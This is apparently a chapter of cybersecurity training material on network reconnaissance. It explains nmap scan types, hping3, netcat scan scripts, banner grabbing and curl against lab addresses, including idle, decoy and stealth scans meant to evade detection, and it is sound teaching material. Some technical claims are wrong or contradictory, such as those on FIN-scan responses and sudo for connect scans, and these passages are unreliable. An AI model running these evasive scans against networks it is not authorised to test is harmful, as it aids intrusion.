Full-Connect scan establishes a complete TCP three-way handshake with a system. The advantage of this method is that a fully functional connection to the target host is made which allows information to be gathered from the listening service (aka banner grabbing). The down side to this method is that the connection is logged on the system being targeted. If done many times, a netstat on that system shows many established connections between the source and target.


nmap -sT -sV 172.16.82.106
(Full TCP connect, service versioning)
nmap -sT 172.16.82.106
TCP Three-Way Handshake:

In a typical TCP connection, a three-way handshake occurs:
The scanning tool (Nmap) sends a SYN (synchronize) packet to the target port.
If the port is open and accepting connections, the target system responds with a SYN-ACK (synchronize-acknowledge) packet.
Finally, the scanning tool sends an ACK (acknowledge) packet to complete the connection setup.
Packet Generation:

In a TCP Full Connect scan, Nmap sends SYN packets to the target ports to initiate a connection.
If the target port responds with a SYN-ACK packet, indicating that the port is open and accepting connections, Nmap proceeds to complete the connection by sending an ACK packet.
If the port is closed or filtered (firewalled), the target system typically responds with an RST (reset) packet to indicate that the connection cannot be established.
Target Response:

If the target port responds with a SYN-ACK packet, indicating that the port is open, Nmap completes the TCP connection by sending an ACK packet.
If the port is closed or filtered, the target system typically responds with an RST packet, indicating that the connection cannot be established.
Nmap analyzes the responses to determine the status of each scanned port.
Interpreting Results:

If Nmap receives a SYN-ACK packet followed by an ACK packet, it marks the port as open.
If Nmap receives an RST packet in response to the SYN packet, it marks the port as closed.
If Nmap does not receive any response, it typically indicates that the port is filtered (firewalled).
Use Cases:

TCP Full Connect scans are reliable and thorough, providing accurate information about the status of each scanned port.
They are useful for reconnaissance to identify open ports and potentially vulnerable services on target systems.
TCP Full Connect scans are more likely to be logged and detected compared to other scan types (e.g., SYN scans, NULL scans), but they provide more detailed information about the target system's TCP/IP stack behavior.
NOTE: TCP Full Connect scan, also known as a TCP Connect scan, is the default scan type used when running as a non-root user. This scan requires sudo to run when not a root user.



Resources


Instructor Note


6.5.3.3.3 Null Scan¶
A null scan has no flags set and a sequence number of 0. All legitimate traffic has flags set, causing any null scan traffic to stand out if viewed. This scan is useful to penetrate firewalls and routers set to filter certain flags out since it uses no flags. Open and filtered ports should have no response, filtered ports may also send an ICMP unreachable message, and closed ports should send a RST packet.


nmap -sN 172.16.82.106
hping3 -c 1 -V -p 80 -s 5050 -Y 172.16.82.106
TCP Flags:

TCP (Transmission Control Protocol) packets contain various flags, including SYN, ACK, FIN, RST, PSH, URG, and SYN-ACK.
In a null scan, Nmap sends TCP packets with none of these flags set, making the packet effectively "empty" in terms of TCP flags.
Packet Generation:

Nmap generates TCP packets with no TCP flags set and sends them to the target system.
This essentially means that no specific request or action is being made by the sender, as no flags are set in the TCP header.
Target Response:

If a port is open and the system receives a null packet, it may respond in various ways depending on its configuration:
Some systems may respond with an RST (Reset) packet to indicate that the port is closed.
Other systems may simply drop the packet without any response.
In some cases, the system may respond with different behavior, which can be indicative of its TCP/IP stack implementation.
Interpreting Results:

If Nmap receives an RST packet in response to the null packet, it marks the port as closed.
If Nmap does not receive any response, it typically indicates that the port is open or filtered (firewalled). However, as with other TCP scans, this can also happen if the target system is configured not to respond to null packets.
Stealthiness:

Null scans are considered stealthy because they send packets with no TCP flags set, making them less likely to be detected by intrusion detection/prevention systems (IDS/IPS).
Some firewalls and security devices may not be configured to detect or block null packets, allowing the scan to proceed undetected.
Use Cases:

Null scans are used for reconnaissance to identify open ports and potentially vulnerable services on target systems.
They can be effective in certain scenarios where other scanning techniques might be detected or blocked.


Resources


Instructor Note


6.5.3.3.4 FIN Scan¶
A FIN scan is a packet with just the FIN flag set. The packet tries to close a connection that does not exist as a way to obtain information. Like the null scan it works to go through firewalls and routers, in addition to being considered stealthier due to the illegal flag combination. Open and filtered ports should have no response, filtered ports may also send an ICMP unreachable message, and closed ports should send a RST packet.


nmap -sF 172.16.82.106
hping3 -c 1 -V -p 80 -s 5050 -F 172.16.82.106
TCP Flags:

TCP (Transmission Control Protocol) packets contain various flags, including SYN, ACK, FIN, RST, and others.
The FIN (Finish) flag is used to indicate the end of data transmission in a TCP connection.
Packet Generation:

In a FIN scan, Nmap generates TCP packets with only the FIN flag set and sends them to the target system.
The absence of the SYN flag (used to initiate a connection) in the packet means that no connection is established.
Target Response:

If a port is open and the system receives a packet with the FIN flag, it should typically respond with an RST (Reset) packet to indicate that the port is closed.
If a port is closed, some systems might respond with an RST packet, while others might simply drop the packet without any response.
Interpreting Results:

If Nmap receives an RST packet in response to the FIN packet, it marks the port as closed.
If Nmap does not receive any response, it typically indicates that the port is open or filtered (firewalled). However, it's important to note that this can also happen if the target system is configured not to respond to FIN packets.
Stealthiness:

FIN scans are considered stealthy because they don't complete the TCP handshake, making them less likely to be logged by intrusion detection/prevention systems (IDS/IPS).
Some older or poorly configured firewalls and security devices may not detect or block FIN packets, allowing the scan to proceed undetected.
Use Cases:

FIN scans are often used to perform reconnaissance on target systems while minimizing the chance of detection.
They can be useful for identifying open ports and potentially vulnerable services without triggering alerts on monitored networks.


Resources


Instructor Note


6.5.3.3.5 XMAS Tree Scan¶
A christmas tree scan is a packet with varying definitions. From nmap it is defined as a packet with FIN, PSH, and URG flags set, while ISS (IBM Internet Security Systems) defines it as all flags are set. Open and filtered ports should have no response, filtered ports may also send an ICMP unreachable message, and closed ports should send a RST packet.


nmap -sX 172.16.82.106
hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF 172.16.82.106
TCP Flags:

TCP (Transmission Control Protocol) packets contain various flags, including FIN, URG, PSH, RST, SYN, and ACK.
In an Xmas scan, Nmap sets the FIN (Finish), URG (Urgent), and PSH (Push) flags in the TCP header.
Packet Generation:

Nmap generates TCP packets with the FIN, URG, and PSH flags set and sends them to the target system.
This combination of flags is unusual and may bypass certain firewall or intrusion detection system (IDS) configurations.
Target Response:

If a port is open and the system receives an Xmas packet, it may respond in various ways depending on its configuration:
Some systems may respond with an RST (Reset) packet to indicate that the port is closed.
Other systems may simply drop the packet without any response.
In some cases, the system may respond with different behavior, which can be indicative of its TCP/IP stack implementation.
Interpreting Results:

If Nmap receives an RST packet in response to the Xmas packet, it marks the port as closed.
If Nmap does not receive any response, it typically indicates that the port is open or filtered (firewalled). However, as with other TCP scans, this can also happen if the target system is configured not to respond to Xmas packets.
Stealthiness:

Xmas scans are considered stealthy because they send packets with unusual combinations of TCP flags, which may evade detection by some security devices.
Some firewalls and IDS/IPS systems may not be configured to detect or block Xmas packets, allowing the scan to proceed undetected.
Use Cases:

Xmas scans are used for reconnaissance to identify open ports and potentially vulnerable services on target systems.
They can be effective in certain scenarios where other scanning techniques might be detected or blocked.


Resources


Instructor Note


6.5.3.3.6 UDP Scan¶
A UDP Scan can be used to find *nix hosts that are blocking TCP and ICMP traffic. Since UDP is a stateless protocol it is often used to get through stateful firewalls. This kind of scan is not very useful for service discovery because UDP is connection-less. UDP is dependent on the application as to how or if there is a response.


 nmap -sU -v 172.16.82.106
UDP Basics:

UDP is a connectionless protocol, meaning it doesn't establish a connection before sending data.
It sends packets (datagrams) without verifying whether the recipient is available or ready to receive the data.
UDP is often used for real-time communication where speed and efficiency are more critical than reliability.
UDP Scan Operation:

In a UDP scan, the scanning tool sends UDP packets to specific ports on the target system.
The scanning tool doesn't wait for a response. Instead, it sends the packets and moves on to the next port.
If a UDP packet is received by the target system on a closed port, the system typically responds with an ICMP port unreachable message.
If a UDP packet is received on an open port, the target system may not send any response, as UDP doesn't require acknowledgment.
Therefore, determining whether a UDP port is open or closed can be more challenging compared to TCP ports.
Interpreting Results:

When analyzing the results of a UDP scan, the absence of a response doesn't necessarily mean the port is closed. It could be open, but the target system might be configured not to respond to UDP packets.
Confirmation of an open UDP port often requires additional techniques, such as application-specific probes or packet sniffing to detect responses from the target system.
False positives and false negatives are common in UDP scanning due to the unreliable nature of UDP.
Use Cases:

UDP scanning is commonly used for discovering services and applications that might be running on non-standard ports or where TCP scanning might not provide accurate results.
It's particularly useful for identifying services like DNS (Domain Name System), SNMP (Simple Network Management Protocol), and DHCP (Dynamic Host Configuration Protocol), which primarily rely on UDP.


Resources


Instructor Note


6.5.3.3.7 Idle Scan¶
An idle scan is a more complex stealth technique that utilizes the previously discussed SYN scan. The scan aims to gather port information using a zombie station on the network where the scanning process appears to have been initiated by the zombie IP address instead of the actual source station who will spoof this address later in the process. This scanning method exploits IP fragmentation identification sequences and implements IP address spoofing.


nmap -sI 172.16.40.10 172.16.82.106
Principle of IP ID Sequence Prediction:

Some systems increment their IP ID (Identification) field for each packet they send, including packets destined for other hosts.
If a system receives packets that it hasn't initiated (like those from an idle scan), its IP ID sequence can reveal whether the scanned port is open, closed, or filtered.
Preparation Phase:

The scanning process starts with identifying a suitable "zombie" system that meets specific criteria:
It must be idle (not actively communicating with other hosts).
It must have predictable IP ID sequence generation behavior.
It must be able to reach the target host.
The attacker sends crafted SYN packets to the zombie host, making it initiate connections to the target host as part of the idle scan.
Idle Scan Execution:

The attacker sends SYN packets to the zombie host, requesting connections to the desired target port.
The zombie host sends the SYN packets to the target as if they were originated by the zombie.
The attacker monitors the changes in the IP ID sequence of packets received from the target.
By analyzing the changes in the IP ID sequence, the attacker can infer whether the target port is open, closed, or filtered without directly interacting with the target.
Interpreting Results:

If the IP ID sequence increases after sending a SYN packet to the target port, it indicates that the port is open.
If the IP ID sequence remains the same or changes unpredictably, it suggests that the port is closed or filtered.
The attacker correlates the IP ID sequence changes with the SYN packets sent to determine the status of each scanned port.
Stealthiness and Anonymity:

Idle scans are considered stealthy and hard to detect because they leverage third-party hosts (zombies) to perform the scanning.
Since the scans appear to originate from the zombie host, the target system logs show activity from the zombie, not from the attacker.
Use Cases:

Idle scans are useful when stealth is paramount, such as in penetration testing or ethical hacking scenarios.
They can help identify open ports and services on a target system without triggering alarms or raising suspicion.


Resources


Instructor Note


6.5.3.3.8 Decoy scan¶
A decoy scan sends multiple packets to each port with different source addresses. This makes it difficult to detect the source but generates lot of traffic. Using ME in your IP list specifies where it is used in the order, and with larger amounts of IPs can mean that yours will not display.


nmap -D 1.2.3.4,5.6.7.8,ME 172.16.82.106
Decoy IP Addresses:

In a decoy scan, the attacker specifies multiple IP addresses (decoy hosts) in addition to their own IP address.
These decoy IP addresses are chosen to be addresses that are unlikely to be associated with the attacker, such as IPs from other networks or even legitimate hosts on the internet.
Packet Generation:

Nmap generates TCP SYN packets (or other types of probes) as part of the scan.
In addition to sending SYN packets from the attacker's IP address, Nmap also sends SYN packets from the specified decoy IP addresses.
The target system receives these packets and logs them as potential scan attempts.
Target Response:

When the target system receives SYN packets from multiple IP addresses, it may become confused about the true source of the scan.
The target system may log the decoy IP addresses as potential sources of the scan, making it harder to trace the scan back to the real attacker.
Interpreting Results:

From the perspective of the target system, it appears as if the scan is originating from multiple sources (decoy hosts) rather than just one.
This can make it more difficult for the target system to identify the true source of the scan or to distinguish it from legitimate network traffic.
Stealthiness:

Decoy scans are considered stealthy because they blend the attacker's activity with legitimate traffic from decoy hosts.
By using decoy IP addresses, the attacker can make it harder for intrusion detection systems (IDS) and network administrators to detect and respond to the scan.
Use Cases:

Decoy scans are often used by attackers to conceal their true identity and evade detection during reconnaissance activities.
They can be particularly useful when conducting penetration tests or security assessments where stealth is important.


Resources


Instructor Note


6.5.3.3.9 Window Scan¶
A window scan functions like an ACK scan but uses the windows size of the responses to determine whether it is open or closed. An ACK scan returns most results as filtered and can be fairly inaccurate. By using the window size the scan can better determine if it is open, closed, or filtered. If the window field is non zero it will display as open, a zero window field will display as closed, and either no response or ICMP unreachable will display as filtered.


nmap -sW 172.16.82.106
Window Scan Operation:

Send Packets: The scanner sends TCP packets to the target ports with a flag that is not part of a standard connection attempt.
Analyze Responses: The target system responds, and the scanner examines the TCP window size field in the responses.
Open Ports: Typically, an open port will respond with a window size that indicates the port is open and accepting connections.
Closed Ports: Closed ports may respond with a different window size or not respond at all, depending on how the target system handles the packet.


Resources


Instructor Note


6.5.3.3.10 RPC scan¶
A RPC scan is looking for services that use RPC (remote Procedure Call). The RPC scan is designed to discover RPC services and their corresponding RPC programs, versions, and sometimes even specific vulnerabilities. This can be useful for network enumeration, identifying exposed RPC services, and assessing security risks.

RPC allows for remote commands to be run on machines and this scan will determine the services and version of the service when run. In updated versions of nmap -sR is aliased to -sV (version scanning) and activates version scanning with the RPC scanning.


nmap -sR 172.16.82.106
How It Works

Scanning for RPC Services:

Send RPC Requests: nmap sends various RPC requests to the target ports that are typically associated with RPC services.
Receive Responses: The target system responds with information about the RPC services running, including service names, versions, and available procedures.
Enumerate RPC Services:

Service Detection: nmap identifies which RPC services are active and collects information about them.
Port Mapping: It can identify which ports are being used for RPC services and whether they are accessible.


Resources


Instructor Note


6.5.3.3.11 FTP bounce scan¶
An FTP bounce scan, also known as a proxy scan, is a technique used by Nmap to scan networks indirectly through an FTP server. This method can be useful when direct scanning is blocked or difficult due to network restrictions.

FTP Bounce: An attack technique that takes advantage of the FTP server's ability to open connections to arbitrary ports on other systems. It utilizes the FTP PORT command to route traffic through the FTP server, potentially bypassing firewalls and other network security measures. The primary use of an FTP Bounce scan is to perform port scanning on target systems that may be behind firewalls or other network defenses. By using the FTP server as a proxy, it can sometimes scan ports that are not directly accessible from the attacker's network.


nmap -b <name>:<pass>@<ftp_server> <victim>
nmap -v -p 21,22,445,80,443 -b student:password@172.16.40.10 192.168.0.0/24
Performing the FTP Bounce Scan

Connect to the FTP Server:

The attacker first connects to an FTP server. The FTP server must be configured to accept connections from the attacker and should not have restrictions on the PORT command.
Send PORT Commands:

The attacker sends a series of PORT commands to the FTP server. Each PORT command specifies an arbitrary port on the target system to which the FTP server should connect.
For example, if the attacker wants to scan port 80 on a target system, the PORT command would instruct the FTP server to connect to port 80 on the target.
FTP Server Connects to Target:

The FTP server then attempts to establish a connection from itself to the specified port on the target system. This connection attempt is made on behalf of the attacker.
Analyze Responses:

Open Port: If the target system accepts the connection, it indicates that the port is open.
Closed Port: If the target system rejects the connection, it indicates that the port is closed.
Filtered Port: If there is no response, it might indicate that the port is filtered or blocked by a firewall.


Resources


Instructor Note


6.5.3.3.12 OS fingerprinting scan¶
An OS fingerprinting scan uses TCP/IP stack fingerprinting to determine what OS is being used. By sending TCP and UDP packets it gathers information such as window size, TCP option ordering and IP ID sampling. It runs that information against its OS database. If a match is found it provides Vendor, OS, Generation, and device type.


nmap -O 172.16.82.106
How it Works:

Probe Selection: Nmap sends a series of probes to the target, including TCP SYN, ACK, RST, and ICMP packets, as well as UDP packets. These probes are designed to elicit specific responses from the target's operating system.
Response Analysis: Nmap examines the target's responses to these probes, looking for patterns and characteristics that are unique to different operating systems. These characteristics can include:
TCP/IP stack behavior: How the target handles TCP/IP packets, such as the timing of responses, the use of options, and the handling of errors.
Protocol version and features: The specific versions of TCP, UDP, and ICMP supported by the target, as well as any additional features or extensions.
Service banner information: The content and format of service banners sent by applications running on the target.
ICMP responses: The types of ICMP responses received from the target, such as echo replies, port unreachable messages, or time exceeded messages.
Pattern Matching: Nmap compares the observed responses to a database of known operating system signatures. This database contains information about the expected behavior of various operating systems under different probing conditions.
Fingerprint Generation: Based on the matching patterns, Nmap generates a fingerprint that represents the likely operating system of the target. This fingerprint can be a simple string, a numerical code, or a more complex data structure.


Resources


Instructor Note


6.5.3.3.13 Version scan¶
A version scan uses open ports and the nmap-service-probes databases to query services to confirm the service running on a port and provide the version of the service running. This allows exploits to be properly chosen for use since different versions and patches are susceptible to different things.


nmap -sV 172.16.82.106
How it Works:

Port Scanning: Nmap first identifies the open ports on the target system.
Service Detection: Once open ports are found, Nmap attempts to determine the type of service running on each port. This is often done by analyzing the service banners sent by the service.
Version Identification: For each identified service, Nmap sends specially crafted packets or commands designed to elicit version information. These packets or commands may vary depending on the service.
Response Analysis: Nmap examines the responses from the service to extract the version number or other identifying information. This can involve parsing the service banner, analyzing the content of packets, or looking for specific patterns in the responses.
Version Database: Nmap compares the extracted version information to a database of known service versions. This database contains information about the vulnerabilities and security implications associated with different versions of each service.


Resources


Instructor Note


6.5.3.3.14 Maimon scan¶
The Maimon scan is named after its discoverer, Uriel Maimon. This technique is exactly the same as NULL, FIN, and Xmas scan, except that the probe is FIN/ACK. It is meant to determine open and closed ports on BSD derived systems. Other systems will generate a RST packet regardless of the port's state. No response indicates either open or filtered, RST closed, and ICMP unreachable error as filtered.


nmap -sM 172.16.82.106
When sending a FIN/ACK packet to a port, the expected behavior is for the port to reply with a RST (Reset) packet if the FIN/ACK is out of state or if the port is closed. This is because a FIN/ACK is not part of a typical TCP connection sequence and indicates an invalid or unexpected state.

However, if no response is received after sending a FIN/ACK, it might suggest that the target host is running a BSD-derived operating system and the port is actually open. This behavior is characteristic of many BSD-based systems, which tend to drop unsolicited FIN/ACK packets silently on open ports, rather than responding with a RST packet. Therefore, the absence of a RST response can be an indication that the port is open on such systems.



Resources


Instructor Note


6.5.3.3.15 ICMP echo discovery probe¶
The Nmap ICMP Echo Discovery Probe is a network discovery technique used by Nmap to determine whether a host is active and reachable on a network. This method utilizes the ICMP (Internet Control Message Protocol) Echo Request and Echo Reply messages, which are fundamental components of the ICMP protocol used for network diagnostics and troubleshooting.

-PE - ICMP Echo Request (Ping) (ICMP type 8/0) scan to discover whether hosts are up and reachable on a network.


nmap -PE 172.16.82.106/27


Resources


Instructor Note


6.5.3.3.16 Timestamp Discovery Probe¶
The Timestamp Discovery Probe in Nmap uses ICMP Timestamp Requests (ICMP type 13/14) to determine if hosts are up and reachable. This method can sometimes bypass certain network filtering or firewall rules that might block other types of probes.

-PP - Uses ICMP Timestamp Request packets (ICMP type 13/14) for host discovery.


nmap -PP 172.16.82.96/27


Resources


Instructor Note


6.5.3.3.17 Netmask Request Discovery Probe¶
Nmap's Netmask Request Discovery Probe works by sending a specific type of ICMP packet known as an ICMP Netmask Request to a target IP address. This packet asks the target host to provide its subnet mask, which is a piece of information used to determine the range of IP addresses within a network.  

-PM - Uses ICMP address mask request packets (ICMP type 17/18) for host discovery. This method is less common but can sometimes bypass certain firewall rules that block ICMP Echo Requests.


nmap -PM -Pn 172.16.82.106


Resources


Instructor Note


6.5.3.3.18 TCP SYN Discovery Ping¶
A syn/ack discovery ping sends an empty TCP packet with only the SYN flag set. When sent, this scan expects a RST packet if the port is closed or a SYN/ACK if the port is open. By default it uses only port 80 and is designed to work only for privileged users on Unix boxes. The scan automatically uses a workaround if the user is not privileged. Returns improper results


nmap -PS21-50 172.16.82.106


Resources


Instructor Note


6.5.3.3.19 TCP ACK Discovery Ping¶
A TCP discovery ping works like the SYN Discovery ping but sets the ACK flag instead of the SYN flag. Both are offered to better allow a user access around or through a firewall. Only works on the same network


nmap -PA21-50 172.16.82.106
hping3 -c 1 -V -p 80 -s 5050 -A 172.16.82.106 (TCP ACK Scan)


Resources


Instructor Note


6.5.3.3.20 UDP Discovery Ping¶
A UDP Discovery scan uses the same idea as both the SYN Discovery ping and the ACK Discovery ping. The difference here is that instead of a TCP packet it uses a UDP packet. Packets are empty except for a few ports (53 and 161). ICMP unreachable messages indicate a closed port, any other ICMP message or no response indicates a down/unreachable host, open ports also will drop responses if there is no payload. The lack of true responses makes this an unreliable scan, but it is able to get around firewalls designed for TCP. Does not return a proper response


nmap -PU21-50 172.16.82.106


Resources


Instructor Note


6.5.3.3.21 SCTP INIT Scan¶
A SCTP INIT scan has characteristics of both TCP and UDP with other features as well. This is the SCTP version of the TCP SYN scan and is able to get through most firewalls. It is considered fairly stealthy and gives reliable open, closed, and filtered results. An INIT-ACK shows as open, no response shows as filtered, and ABORT shows as closed.


nmap -sY 172.16.82.106


Resources


Instructor Note


6.5.3.4 NMAP Time-Out Options¶
NMAP - TIME-OUT
T0	T1	T2	T3	T4	T5
Name	Paranoid	Sneaky	Polite	Normal	Aggressive	Insane
min-rtt-timeout	100 ms	100 ms	100 ms	100 ms	100 ms	50 ms
max-rtt-timeout	5 minutes	15 seconds	10 seconds	10 seconds	1250 ms	300 ms
initial-rtt-timeout	5 minutes	15 seconds	1 second	1 second	500 ms	250 ms
max-retries	10	10	10	10	6	2


Timing Template	Aggressiveness	Scan Speed	Timeouts/Probe Behavior	Typical Use Case
-T0 (Paranoid)	Very Cautious	Very Slow	Very long timeouts for each probe (e.g., 5+ seconds)	Stealth scans to avoid detection, very slow.
-T1 (Sneaky)	Cautious	Slow	Long timeouts (around 3-5 seconds)	Stealthy scan, used to evade detection.
-T2 (Polite)	Moderate	Slower than normal	Medium timeouts (around 2-4 seconds)	Used when trying to avoid detection but still get results, suitable for scanning busy targets.
-T3 (Normal)	Normal	Normal (default)	Shorter timeouts (around 1-2 seconds)	Default for general-purpose scanning, balancing speed and stealth.
-T4 (Aggressive)	Aggressive	Faster than normal	Short timeouts (under 1 second)	Faster scans, may trigger detection. Ideal for non-sensitive or time-sensitive scans.
-T5 (Insane)	Very Aggressive	Very Fast	Very short timeouts (fractions of a second)	Extremely fast scans, very likely to be detected. Used in scenarios where speed is crucial and detection isn't a concern.


Resources


Instructor Note


6.5.3.5 NMAP Timing and Performance Options¶
NMAP - DELAY

--scan-delay <time> - Minimum delay between probes

Nmap to wait at least the given amount of time between each probe it sends to a given host.
--max-scan-delay <time> - Max delay between probes

Specifies the largest delay that Nmap will allow.
NMAP - RATE LIMIT

--min-rate <number> - Minimum packets per second

Nmap will do its best to send packets as fast as or faster than the given rate.
--max-rate <number> - Max packets per second

Nmap will try to keep the sending rate at or above the given rate of packets per second.


Resources


Instructor Note


6.5.4 Firewalking¶
Firewalking

Firewalking is a technique used to determine if packets can pass through a firewall without being blocked. It involves sending packets with TTL values set to expire just before reaching the firewall, and observing whether ICMP Time Exceeded messages are returned by the firewall or other devices.
Firewalking can help identify open ports and services allowed through a firewall, as well as potential security holes or misconfigurations in firewall rules.
Firewalking requires careful selection of TTL values and may not always yield conclusive results, especially if the firewall or intermediate devices are configured to block ICMP messages or hide their presence.
Traceroute:

Traceroute is a tool used to trace the route packets take from the local machine to a destination host. It works by sending packets with incrementally increasing Time-To-Live (TTL) values and observing the ICMP Time Exceeded messages returned by intermediate routers. ** This allows the traceroute tool to map out the network path taken by packets to reach the destination.
Traceroute is commonly used to diagnose network connectivity issues, identify routing loops or delays, and troubleshoot network performance problems.
Traceroute does not have the capability to bypass firewalls or security devices, as it relies on the cooperation of intermediate routers to return ICMP Time Exceeded messages.

traceroute 172.16.82.106
traceroute 172.16.82.106 -p 123
sudo traceroute 172.16.82.106 -I
sudo traceroute 172.16.82.106 -T
sudo traceroute 172.16.82.106 -T -p 443


Resources


Instructor Note


6.5.5 Netcat¶
Active External Network Reconnaissance: Scans with Netcat

Netcat, also known as "nc," is a versatile networking utility that allows for reading from and writing to network connections using TCP or UDP protocols. It's often referred to as the "Swiss Army knife" of networking tools due to its wide range of functionalities. Netcat is available on most Unix-like operating systems, including Linux, macOS, and BSD, as well as on Windows platforms.

Netcat is a tool that can be used to create various inbound/outbound tcp (or udp) connections.

Some actions that Netcat can perform:

Port Scanning: Netcat can be used to perform basic port scanning by attempting to connect to a range of ports on a target host. This can help identify open ports and services running on a system.

File Transfer: Netcat allows for the transfer of files between systems over a network connection. It can act as both a client and a server, facilitating the transfer of data in either direction.

Remote Shell Access: Netcat can be used to establish a simple remote shell session between two systems, allowing for command execution and interaction with a remote system's shell.

Port Forwarding: Netcat can be used to set up port forwarding or redirection, allowing traffic destined for one port on a system to be forwarded to another port on a different system.

Chat and Messaging: Netcat can facilitate real-time chat or messaging between two systems by establishing a network connection and allowing users to exchange messages.

Network Debugging: Netcat can be used for network debugging and troubleshooting purposes, such as testing network connectivity, checking firewall rules, and analyzing network traffic.

NOTE: It is important to ensure you identify what version of netcat you have installed, this will let you know what options you can and cannot use!



Resources


Instructor Note


6.5.5.1 Scanning with Netcat¶

nc [OPTIONS] [TARGET IP] [TARGET PORT]

nc -h       (Help Menu)
man nc      (Man Pages)
-z : Port scanning mode i.e. zero I/O mode.

-v : Be verbose [use twice -vv to be more verbose].

-n : Use numeric-only IP addresses i.e. do not use DNS to resolve ip addresses.

-w1 : Set time out value to 1. Else it will use the default TCP timeout period of 3-5 seconds.

-u : To switch to UDP.

Netcat does not use the (-p) to specify ports to scan. The (-p) is only used with the (-l) to specify a listening port.

-p : Specify the local bind port number for listening. Without this option, netcat will listen on a random ephemeral port.
-l : Listen mode. Netcat will listen for incoming connections on a random high port or a specified bind port if (-p) is used.
To specify the ports to scan (connect) they simply need to be entered after the IP address separated by a space.

21 22 23 80 443
You can specify one port or a range of ports using the hyphen (-).
1-1023
Netcat does not allow the use of commas (,). To separate ports they must be separated by a space.

To scan one TCP port


nc -nzvw1 [TARGET IP] 443
nc -nzvw1 [TARGET IP] 80
nc -nzvw1 [TARGET IP] 21
nc -nzvw1 [TARGET IP] 22
nc -nzvw1 [TARGET IP] 23
nc -nzvw1 [TARGET IP] 25
* To scan one UDP port

nc -nzuv [TARGET IP] 443
nc -nzuv [TARGET IP] 67
nc -nzuv [TARGET IP] 53
nc -nzuv [TARGET IP] 69
nc -nzuv [TARGET IP] 53
To scan a range of ports

## really fast scanner with 1 timeout value ##
netcat -nzvw1 [TARGET IP] 1-1023
To scan Discontiguous ports

netcat -nzvw1 [TARGET IP] 21-23 25 80 443


Resources


Instructor Note


6.5.5.2 Netcat Scan Scripts¶
Netcat scan scripts are custom scripts that leverage Netcat (nc) for performing various types of network scans, such as port scanning, banner grabbing, and more.

Netcat can only scan one IP address at a time and is not able to scan whole network blocks like NMAP can. We can however create a script using a for loop to scan a range of IP address and ports.

Depending on the flavor of linux you are using, netcat open port output can respond with open (Debian) or succeeded (Ubuntu). We will use the grep -E succ|open.

-E (--extended-regexp) - Interpret PATTERNS as extended regular expressions.

Create TCP scan.sh file:

nano scan.sh
Copy and paste the following contents into the scan.sh file:


#!/bin/bash

echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports

for ((i=$start; $i<=$end; i++))

do
    nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open' &
done
wait
# (-v) running verbosely (-v on Linux, -vv on Windows),
# (-n) not resolving names. numeric only IP(no D.S)
# (-z) without sending any data. zero-I/O mode(used for scanning)
# (-w1) waiting no more than 1second for a connection to occur
# (2>&1) redirect STDERR to STDOUT. Results of scan are errors and need to redirect to output to grep
# ( | grep -E 'succ|open') for Debian/Ubuntu to display only open connections
# (&) put the scan into the background to run all scan simultaneous
# (wait) wait for all background process to complete before closing
Make the scan.sh file executable:


chmod +x scan.sh
Create UDP udpscan.sh file:

#!/bin/bash

echo "Enter network address (e.g. 192.168.0): "
read net
echo "Enter starting host range (e.g. 1): "
read start
echo "Enter ending host range (e.g. 254): "
read end
echo "Enter ports space-delimited (e.g. 21-23 80): "
read ports

for ((i=$start; $i<=$end; i++))

do
    nc -nuvz $net.$i $ports 2>&1 | grep -E 'succ|open'
done

# (-v) running verbosely (-v on Linux, -vv on Windows),
# (-n) not resolving names. numeric only IP(no D.S)
# (-z) without sending any data. zero-I/O mode(used for scanning)
# (-w1) waiting no more than 1second for a connection to occur
# (2>&1) redirect STDERR to STDOUT. Results of scan are errors and need to redirect to output to grep
# ( | grep -E 'succ|open') for Debian/Ubuntu to display only open connections


Resources


Instructor Note


6.5.5.3 Netcat One-Liner Scan¶
A Netcat one-liner scan is a compact command used to scan a range of ports on a target machine in a single line of code. This technique is useful for quickly checking which ports are open on a target system.

Vertical Scanning - One, many, or all ports on one target.

TCP

nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'
nc -nzvw1 172.16.82.106 1024-65535 2>&1 | grep -E 'succ|open'
UDP

nc -nuzvw1 172.16.82.106 53 67 68 123 2>&1 | grep -E 'succ|open'
nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open'
Horizontal Scanning - Many or all ports on a range of targets.

TCP

for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
UDP

for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'


Resources


Instructor Note
6.5.5.4 Netcat Banner Grabbing¶
Netcat banner grabbing is a technique used to obtain information about a service running on a specific port by connecting to it and analyzing the banner it presents. Banners often include details about the software version, operating system, or other configurations that can be useful for network reconnaissance and security assessments.

SSH Ports:


nc 10.10.0.40 22

SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4
Telnet ports:


nc -t 10.10.0.40 23

Telnet Debian GNU/Linux 10
blue-internet-host-student-19 login:
HTTP Ports:


echo "GET /" | nc 10.10.0.40 80

This is the webserver on Internet Host


Resources


Instructor Note


6.5.6 Curl and Wget¶
Curl

Curl is a Linux command line tool which has the purpose of transfering data to and from servers. It can be used with any of the following protocols (HTTP, FTP, IMAP, POP3, SCP, SFTP, SMTP, TFTP, TELNET and LDAP). For this class you will mainly be using it to interact with service ports in order to see if they return any flags, or to identify what service is actually running on the port with banner grabbing.

Curl defaults to HTTP unless otherwise specified with the appropriate protocol designator.


curl http://www.google.com

curl http://www.google.com:443

curl http://www.google.com/file.txt

curl http://www.google.com/file.txt -o output.txt

curl ftp://123.45.67.8

curl ftp://123.45.67.8/file.txt

curl ftp://123.45.67.8/file.txt -o output.txt
Basic Options

-o, --output <file>: Write output to instead of stdout.
-O, --remote-name: Save the file with the same name as the remote file.
-L, --location: Follow redirects if the server responds with a redirect.
-C, --continue-at <offset>: Resume a previous file transfer at the given offset.
-u, --user <user:password>: Specify the user and password for server authentication.
HTTP/HTTPS Options

-H, --header <header>: Pass custom header(s) to the server.
-d, --data <data>: Send data in a POST request.
-F, --form <name=content>: Submit form data.
-X, --request <command>: Specify a custom request method to use.
Connection Options

-I, --head: Fetch the headers only.
-N, --no-buffer: Disable buffering of the output stream.
-k, --insecure: Allow connections to SSL sites without certificates.
